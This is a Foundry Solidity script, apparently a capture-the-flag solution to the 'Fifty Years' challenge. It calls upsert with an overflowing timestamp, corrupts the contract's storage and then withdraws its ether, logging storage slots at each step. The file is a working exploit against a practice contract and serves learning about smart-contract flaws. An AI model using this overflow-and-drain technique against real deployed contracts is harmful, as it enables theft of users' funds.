// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

contract ContractScript is Script {
    function setUp() public {}

    function run() public {
        // add your instance of challenge contract via address and declared interface
        FiftyYearsChallenge victim = FiftyYearsChallenge(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda);

        console.log('before `upsert`');
        printStorage();

        // execute script commands from player's account
        vm.startPrank(0xE6fa91E51B46A62C372114Ba3F6a154f564162B9);
        victim.upsert{value: 1}(6666, type(uint).max - 1 days + 1);

        console.log('after 1st `upsert`');
        printStorage();

        victim.upsert{value: 1}(6666, 0);

        console.log('after 2nd `upsert`');
        printStorage();

        // check the balance as Anvil and Forge tracing were inconsistent whether next call transfer all the balance or not
        // `--legacy` flag unfortunately didn't help to resolve this inconsistency
        console.log(address(victim).balance);
        console.log(address(0xE6fa91E51B46A62C372114Ba3F6a154f564162B9).balance);

        // victim.withdraw(type(uint).max);
        victim.withdraw(1);
        console.log('after `withdraw` with `index` == 1');
        printStorage();
    }

    function printStorage() internal {
        console.log("slot #0 (`Contribution[] queue` length)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 0));
        console.log("slot #1 (`head`)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, bytes32(uint(1))));
        console.log("slot #2 (`owner` address)");
        console.logBytes32(vm.load(0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, bytes32(uint(2))));
        console.log("slot before keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e562
        ));
        console.log("slot 0 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
        ));
        console.log("slot 1 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e564
        ));
        console.log("slot 2 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e565
        ));
        console.log("slot 3 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e566
        ));
        console.log("slot 4 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e567
        ));
        console.log("slot 5 of keccak(0)");
        console.logBytes32(vm.load(
            0x18441B9FBD75A611e692DeFc6025c1c58539Fbda, 
            0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e568
        ));
    }
}

interface FiftyYearsChallenge {
    function upsert(uint256 index, uint256 timestamp) external payable;
    function withdraw(uint256 index) external;
}
